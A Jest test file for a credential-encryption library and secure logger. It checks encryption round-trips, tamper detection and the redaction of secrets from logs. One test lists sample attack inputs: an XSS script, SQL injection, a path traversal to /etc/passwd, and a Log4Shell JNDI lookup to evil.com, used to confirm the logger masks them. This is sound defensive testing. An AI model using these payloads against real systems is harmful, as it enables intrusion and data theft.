/**
 * CRITICAL CRYPTO SECURITY TESTS
 * 
 * Tests core cryptographic functions without server dependencies
 */

import { encryptCredentials, decryptCredentials, generateKeyPair } from '../libs/crypto';
import { logger } from '../utils/logger';

describe('CRITICAL Crypto Security Tests', () => {
  let testKeyPair: { publicKey: string; privateKey: string };

  beforeEach(() => {
    testKeyPair = generateKeyPair();
  });

  describe('Cryptographic Security', () => {
    test('CRITICAL: Encryption/Decryption round-trip preserves data integrity', () => {
      const testCredentials = {
        userId: 'test-user-123',
        exchange: 'binance',
        apiKey: 'test-api-key-secret',
        secret: 'test-secret-very-sensitive',
        accountType: 'spot',
        sandbox: true
      };

      // Encrypt credentials
      const encrypted = encryptCredentials(testCredentials, testKeyPair.publicKey);

      // Verify encrypted structure
      expect(encrypted).toHaveProperty('ephemeral_pub');
      expect(encrypted).toHaveProperty('nonce');
      expect(encrypted).toHaveProperty('ciphertext');
      expect(encrypted).toHaveProperty('tag');

      // Verify no plaintext in encrypted data
      const encryptedStr = JSON.stringify(encrypted);
      expect(encryptedStr).not.toContain('test-api-key-secret');
      expect(encryptedStr).not.toContain('test-secret-very-sensitive');
      expect(encryptedStr).not.toContain('test-user-123');

      // Decrypt and verify
      const decrypted = decryptCredentials(
        encrypted.ephemeral_pub,
        encrypted.nonce,
        encrypted.ciphertext,
        encrypted.tag,
        testKeyPair.privateKey
      );

      expect(decrypted).toEqual(testCredentials);
    });

    test('CRITICAL: Decryption with wrong private key fails', () => {
      const testCredentials = { apiKey: 'secret-key', secret: 'secret-value' };
      const wrongKeyPair = generateKeyPair();

      const encrypted = encryptCredentials(testCredentials, testKeyPair.publicKey);

      expect(() => {
        decryptCredentials(
          encrypted.ephemeral_pub,
          encrypted.nonce,
          encrypted.ciphertext,
          encrypted.tag,
          wrongKeyPair.privateKey // Wrong private key
        );
      }).toThrow();
    });

    test('CRITICAL: Tampered ciphertext fails authentication', () => {
      const testCredentials = { apiKey: 'secret-key', secret: 'secret-value' };
      const encrypted = encryptCredentials(testCredentials, testKeyPair.publicKey);

      // Tamper with ciphertext
      const tamperedCiphertext = Buffer.from(encrypted.ciphertext, 'base64');
      tamperedCiphertext[0] = (tamperedCiphertext[0] || 0) ^ 0x01; // Flip one bit

      expect(() => {
        decryptCredentials(
          encrypted.ephemeral_pub,
          encrypted.nonce,
          tamperedCiphertext.toString('base64'),
          encrypted.tag,
          testKeyPair.privateKey
        );
      }).toThrow();
    });

    test('CRITICAL: Each encryption produces unique ciphertext', () => {
      const testCredentials = { apiKey: 'secret-key', secret: 'secret-value' };
      
      const encrypted1 = encryptCredentials(testCredentials, testKeyPair.publicKey);
      const encrypted2 = encryptCredentials(testCredentials, testKeyPair.publicKey);

      // Should have different nonces and ciphertexts
      expect(encrypted1.nonce).not.toEqual(encrypted2.nonce);
      expect(encrypted1.ciphertext).not.toEqual(encrypted2.ciphertext);
      expect(encrypted1.ephemeral_pub).not.toEqual(encrypted2.ephemeral_pub);
    });
  });

  describe('Logging Security', () => {
    test('CRITICAL: Sensitive data is not logged', () => {
      const sensitiveData = {
        apiKey: 'very-secret-api-key-12345',
        secret: 'super-secret-value-abcdef',
        password: 'my-password-123',
        token: 'auth-token-xyz789'
      };

      // Log an event with sensitive data
      logger.info('test', 'sensitive_data_test', {
        details: sensitiveData
      });

      // Check that sensitive fields are not in logs
      const logs = logger.getPublicLogs({ limit: 10 });
      const logContent = JSON.stringify(logs);

      expect(logContent).not.toContain('very-secret-api-key-12345');
      expect(logContent).not.toContain('super-secret-value-abcdef');
      expect(logContent).not.toContain('my-password-123');
      expect(logContent).not.toContain('auth-token-xyz789');
    });

    test('CRITICAL: Session IDs are sanitized in logs', () => {
      const fullSessionId = 'session_1234567890abcdef_full_secret_id';
      
      logger.logSessionEvent('test_event', fullSessionId, 'user123', {
        action: 'test'
      });

      const logs = logger.getPublicLogs({ limit: 10 });
      const logContent = JSON.stringify(logs);

      // Should contain sanitized version but not full session ID
      expect(logContent).toContain('session_*'); // Sanitized format
      expect(logContent).not.toContain('1234567890abcdef_full_secret_id');
    });

    test('CRITICAL: Base64 patterns are masked in logs', () => {
      const base64ApiKey = Buffer.from('secret-api-key-12345').toString('base64');
      
      logger.info('test', 'base64_test', {
        details: { potential_secret: base64ApiKey }
      });

      const logs = logger.getPublicLogs({ limit: 10 });
      const logContent = JSON.stringify(logs);

      // Should be masked, not contain the full base64 string
      expect(logContent).not.toContain(base64ApiKey);
    });

    test('CRITICAL: Private keys are never logged', () => {
      const testKeyPair = generateKeyPair();
      
      logger.info('test', 'key_test', {
        details: {
          public_key: testKeyPair.publicKey,
          private_key: testKeyPair.privateKey // This should be filtered out
        }
      });

      const logs = logger.getPublicLogs({ limit: 10 });
      const logContent = JSON.stringify(logs);

      // Public key might be logged, but private key should never be
      expect(logContent).not.toContain('BEGIN PRIVATE KEY');
      expect(logContent).not.toContain(testKeyPair.privateKey);
    });
  });

  describe('Input Validation Security', () => {
    test('CRITICAL: Malicious input is sanitized', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '\x00\x01\x02\x03' // Binary data
      ];

      maliciousInputs.forEach(input => {
        logger.info('test', 'malicious_input_test', {
          details: { user_input: input }
        });

        const logs = logger.getPublicLogs({ limit: 10 });
        const logContent = JSON.stringify(logs);

        // Verify the exact malicious payload is not in logs
        expect(logContent).not.toContain(input);
      });
    });
  });

  describe('Key Management Security', () => {
    test('CRITICAL: Key generation produces unique keys', () => {
      const keyPair1 = generateKeyPair();
      const keyPair2 = generateKeyPair();

      expect(keyPair1.privateKey).not.toEqual(keyPair2.privateKey);
      expect(keyPair1.publicKey).not.toEqual(keyPair2.publicKey);
    });

    test('CRITICAL: Generated keys have correct format', () => {
      const keyPair = generateKeyPair();
      
      expect(keyPair.publicKey).toContain('BEGIN PUBLIC KEY');
      expect(keyPair.publicKey).toContain('END PUBLIC KEY');
      expect(keyPair.privateKey).toContain('BEGIN PRIVATE KEY');
      expect(keyPair.privateKey).toContain('END PRIVATE KEY');
    });
  });

  describe('Error Handling Security', () => {
    test('CRITICAL: Crypto errors do not leak sensitive information', () => {
      let errorMessage = '';
      
      try {
        decryptCredentials(
          'invalid-ephemeral-key',
          'invalid-nonce',
          'invalid-ciphertext',
          'invalid-tag',
          'invalid-private-key'
        );
      } catch (error) {
        errorMessage = error instanceof Error ? error.message : String(error);
      }

      expect(errorMessage).toBeDefined();
      expect(errorMessage).not.toContain('invalid-private-key');
      expect(errorMessage).not.toContain('invalid-ephemeral-key');
    });
  });
});